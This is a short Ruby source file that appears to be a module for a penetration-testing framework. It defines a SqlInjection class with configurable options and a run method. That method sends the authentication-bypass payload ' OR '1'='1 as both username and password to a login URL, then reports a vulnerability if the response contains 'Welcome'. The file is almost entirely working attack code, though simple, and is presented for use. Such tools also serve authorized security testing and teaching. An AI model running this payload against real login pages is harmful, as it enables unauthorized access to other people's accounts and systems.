require 'net/http'
require 'uri'

class SqlInjection
  attr_accessor :options

  def initialize
    @options = { "url" => "http://example.com/login" }
  end

  def set_option(option, value)
    key = @options.keys.find { |k| k.downcase == option.strip.downcase }
    if key
      @options[key] = value
      puts "[*] Set #{key} to #{value}"
    else
      puts "[-] Option '#{option}' not found."
    end
  end

  def show_options
    puts "\n[SqlInjection Options]"
    @options.each { |k, v| puts "#{k.ljust(12)}: #{v}" }
    puts ""
  end

  def run
    url = @options["url"]
    puts "\n[SqlInjection] Testing for SQL injection vulnerability on #{url}..."
    injection_payload = "' OR '1'='1"
    uri = URI.parse(url)
    params = { "username" => injection_payload, "password" => injection_payload }
    uri.query = URI.encode_www_form(params)
    response = Net::HTTP.get_response(uri)
    if response.body && response.body.include?("Welcome")
      puts "[*] Possible SQL injection vulnerability found."
    else
      puts "[-] SQL injection test did not return conclusive evidence."
    end
    puts "[SqlInjection] Test completed.\n"
  end
end